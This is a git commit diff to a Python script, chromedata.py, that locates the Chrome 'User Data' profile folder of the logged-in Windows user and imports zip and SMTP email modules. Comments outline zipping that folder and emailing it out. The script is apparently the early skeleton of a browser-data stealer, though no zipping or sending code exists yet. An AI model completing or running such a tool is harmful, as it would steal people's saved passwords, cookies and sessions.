0896492a74a6fa7d9b3e489aed86987cf8b0eb4b
shaaaarky <155846610+shaaaarky@users.noreply.github.com>
2024-02-01 22:45:09 +0100

    I cant do this anymore

--- python/chromedata.py
+++ python/chromedata.py
@@ -1,19 +1,13 @@
 import os
 import zipfile
-
-# C:\Users\JohnBradshawCantos\AppData\Local\Google\Chrome\User Data\Default
+# Modules for working with emails
+import smtplib, ssl
 
 # Find the user of computer and store it
 user = os.getlogin()
-
-
 # Getting the directory 
 chrome_data_dir = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"
-os.chdir(chrome_data_dir)
-print(os.getcwd())
+# os.chdir(chrome_data_dir)
+# print(os.getcwd())
 
 
-
-# Function to zip folder containing the data
-
-# Function to send zip folder to email address
